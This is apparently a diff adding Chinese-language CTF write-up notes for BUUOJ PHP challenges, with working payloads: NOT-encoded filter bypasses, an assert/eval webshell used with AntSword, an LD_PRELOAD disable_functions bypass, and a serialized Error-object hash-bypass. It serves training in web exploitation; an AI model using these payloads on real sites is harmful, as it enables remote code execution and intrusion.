@@ -203,3 +203,80 @@ password=404a&money[]=100000000
 ```
 根据F12的页面提示，改POST，先改user绕过身份验证，再数字改字符和使用数组绕过弱等于验证
 ### [2019 RCE ME](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]RCE%20ME)
+```php
+<?php
+echo urlencode(~'phpinfo')
+?>
+```
+phpinfo()变成
+```
+GET /?code=(~%8F%97%8F%96%91%99%90)(); 
+```
+查看phpinfo返回页面`disable_functions`显示`system`被禁用。构造马
+```php
+<?php
+$a = 'assert'; 
+echo urlencode(~$a);
+echo ("<p>");
+$b = '(eval($_POST[cmd]))';
+echo urlencode(~$b)
+?>
+```
+变成
+```
+GET /?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6); 
+```
+用AntSword能够访问成功，看到flag和readflag，下一步需要绕过`disable_functions`被禁函数执行readflag  
+LD_PRELOAD预加载.so库以达到覆盖系统函数的目的。  
+[bypass_disablefunc_via_LD_PRELOAD](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD.git)  
+```
+?code=$_GET['_']($_GET['__']);&_=assert&__=include('/var/tmp/bypass_disablefunc.php')&cmd=/readflag&outpath=/var/tmp/res&sopath=/var/tmp/bypass_disablefunc_x64.so
+
+GET /?code=${~(%A0%B8%BA%AB)}['_'](${~(%A0%B8%BA%AB)}['__']);&_=assert&__=include('/tmp/bypass_disablefunc.php')&cmd=/readflag&outpath=/tmp/res&sopath=/tmp/bypass_disablefunc_x64.so HTTP/1.1
+```
+### [Roamphp1-Welcome](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Roamphp1-Welcome)
+服务器返回405错误，GET改POST加`Content-Type: application/x-www-form-urlencoded`
+```
+POST /?roam[]=3&roam2[]=4 HTTP/1.1
+Host: 7e79b38b-39a6-4210-98c5-9b67a8ef60cc.node5.buuoj.cn:81
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 21
+
+roam1[]=1&roam2[]=2
+```
+phpinfo()页面中显示有个文件`f1444aagggg.php`访问返回`Flag: SYC{w31c0m3_t0_5yc_r0@m_php1}`但并不是，flag直接放在phpinfo()页面中
+```
+GET /f1444aagggg.php HTTP/1.1
+```
+### [Greatphp](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Greatphp)
+php中md5和sha1的绕过
+```php
+<?php
+class SYCLOVER {
+        public $syc;
+        public $lover;
+}
+// 正则过滤，改用urlencode-decode/xor
+$cmd = "/flag";
+$cmdencode = urlencode(~$cmd);
+echo $cmdencode;
+echo "\n";
+/* <?= ?> 等同于<?php ?> */
+$str = "?><?=include~".urldecode($cmdencode)."?>";
+$cls = new SYCLOVER();
+// 同一行保证message相同，但类本身因错误码不同而不同
+$a = new Error($str, 1);$b = new Error($str, 2); 
+
+$cls->syc = $a; 
+$cls->lover = $b; 
+
+echo urlencode(serialize($cls));
+?>
+```
+### [](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Roamphp2-Myblog)
